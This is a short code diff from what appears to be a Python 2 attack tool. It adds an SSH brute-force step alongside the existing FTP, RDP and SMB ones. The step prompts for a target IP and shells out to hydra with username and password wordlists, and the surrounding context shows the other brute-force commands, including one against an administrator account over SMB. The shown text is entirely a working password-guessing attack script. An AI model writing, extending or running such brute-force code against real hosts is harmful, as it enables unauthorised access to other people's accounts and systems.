@@ -13,6 +13,7 @@ def brute_force():
     ftpIp = raw_input("Enter attack target ftp ip: ");
     rdpIp = raw_input("Enter attack target rdpHost ip: ");
     smbIp = raw_input("Enter attack target smbHost ip: ");
+    sshIp = raw_input("Enter attack target sshHost ip: ");
     if(ftpIp == ''):
         print '[-] Skip ftp_Brute Attack.'
     else:
@@ -25,7 +26,10 @@ def brute_force():
 		print '[-] Skip smb_Brute Attack.'
     else:
 		os.system('hydra -l administrator -P ./passwd.list %s smb -V'%(smbIp))
-
+    if(sshIp == ''):
+		print '[-] Skip ssh_Brute Attack.'
+    else:
+		os.system('hydra -L ./user.list -P ./passwd.list -e ns -V %s ssh'%(sshIp))
 
 
 def web_dir_brute():
